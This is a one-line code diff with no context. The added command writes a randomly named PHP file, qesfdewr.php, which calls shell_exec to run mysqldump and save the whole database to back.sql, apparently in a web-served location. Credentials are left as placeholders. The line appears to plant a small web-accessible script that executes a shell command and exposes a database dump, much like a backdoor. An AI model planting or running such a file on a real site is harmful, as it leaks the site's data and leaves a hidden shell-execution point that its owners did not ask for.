@@ -1,0 +1,1 @@
+echo '<?php shell_exec("mysqldump -u_ -p_ --add-drop-table _ > back.sql");' > qesfdewr.php
